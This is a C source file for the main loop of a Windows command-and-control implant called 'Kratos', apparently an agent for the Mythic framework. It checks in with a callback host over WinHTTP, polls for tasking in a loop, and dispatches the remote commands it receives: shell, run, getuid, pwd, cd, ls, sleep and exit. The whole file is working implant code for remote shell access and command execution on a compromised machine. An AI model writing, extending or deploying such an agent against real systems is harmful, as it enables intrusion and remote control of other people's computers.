#define _WIN32_WINNT 0x0600
#include "Checkin.h"
#include "commands.h"
#include "config.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

#ifndef SLEEP_TIME
#define SLEEP_TIME 5
#endif

// Globals
char current_uuid[128];
int current_sleep_time = SLEEP_TIME * 1000; // Convert seconds to milliseconds

#ifndef UUID
// #define AGENT_UUID "..."
#endif

// Debug Macro (duplicated from utils.c for now, or move to common header)
#if DEBUG
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
    fprintf(stdout, "[DEBUG] ");                                               \
    fprintf(stdout, __VA_ARGS__);                                              \
    fprintf(stdout, "\n");                                                     \
    fflush(stdout);                                                            \
  } while (0)
#else
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
  } while (0)
#endif

int main() {
  strncpy(current_uuid, AGENT_UUID, sizeof(current_uuid) - 1);
  current_uuid[sizeof(current_uuid) - 1] = '\0';

  DEBUG_PRINT("Kratos agent started.");
  DEBUG_PRINT("UUID: %s", current_uuid);
  // CALLBACK_HOST/PORT are macros, available here if config.h is included
  // But they are used inside send_c2_message mainly.
  // DEBUG_PRINT("Target: %s:%d%s", CALLBACK_HOST, CALLBACK_PORT, POST_URI);
  // We can include defaults here too if we want to print target info.
  // For brevity let's trust utils handles connection.

  while (1) {
    // Checkin Logic
    if (strncmp(current_uuid, AGENT_UUID, 36) == 0) {
      if (CheckinSend()) {
        DEBUG_PRINT("Checkin successful. UUID updated to: %s", current_uuid);
      } else {
        DEBUG_PRINT("Checkin failed/retrying...");
      }
    } else {
      // Get Tasking
      char json_msg[4096];
      snprintf(json_msg, sizeof(json_msg),
               "{\"action\": \"get_tasking\", \"tasking_size\": -1, \"uuid\": "
               "\"%s\"}",
               current_uuid);

      char *b64_resp = send_c2_message(json_msg);

      if (b64_resp && strlen(b64_resp) > 0) {
        char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));

        if (json_resp) {
          DEBUG_PRINT("Response JSON: %.100s...", json_resp);
          // ... tasks parsing ...

          char *tasks_ptr = strstr(json_resp, "\"tasks\"");
          if (tasks_ptr) {
            // ... process tasks ...
            char *cmd_local_ptr = tasks_ptr;
            while ((cmd_local_ptr = strstr(cmd_local_ptr, "\"command\""))) {
              char cmd_name[32] = {0};
              extract_json_string(cmd_local_ptr, "command", cmd_name,
                                  sizeof(cmd_name));
              char task_id[64] = {0};
              extract_json_string(cmd_local_ptr, "id", task_id,
                                  sizeof(task_id));
              char params[2048] = {0};
              extract_json_string(cmd_local_ptr, "parameters", params,
                                  sizeof(params));

              if (strlen(cmd_name) > 0) {
                printf("Processing task: %s (ID: %s)\n", cmd_name, task_id);
                if (0) {
                }
#ifdef INCLUDE_CMD_SHELL
                else if (strcmp(cmd_name, "shell") == 0)
                  command_shell(task_id, params);
#endif
#ifdef INCLUDE_CMD_RUN
                else if (strcmp(cmd_name, "run") == 0)
                  command_run(task_id, params);
#endif
#ifdef INCLUDE_CMD_GETUID
                else if (strcmp(cmd_name, "getuid") == 0)
                  command_getuid(task_id, params);
#endif
#ifdef INCLUDE_CMD_PWD
                else if (strcmp(cmd_name, "pwd") == 0)
                  command_pwd(task_id, params);
#endif
#ifdef INCLUDE_CMD_CD
                else if (strcmp(cmd_name, "cd") == 0)
                  command_cd(task_id, params);
#endif
#ifdef INCLUDE_CMD_LS
                else if (strcmp(cmd_name, "ls") == 0)
                  command_ls(task_id, params);
#endif
#ifdef INCLUDE_CMD_SLEEP
                else if (strcmp(cmd_name, "sleep") == 0)
                  command_sleep(task_id, params);
#endif
#ifdef INCLUDE_CMD_EXIT
                else if (strcmp(cmd_name, "exit") == 0)
                  command_exit(task_id, params);
#endif
              }
              cmd_local_ptr += 1;
            }
          }
          free(json_resp);
        }
        free(b64_resp);
      }
    }
    Sleep(current_sleep_time);
  }
  return 0;
}
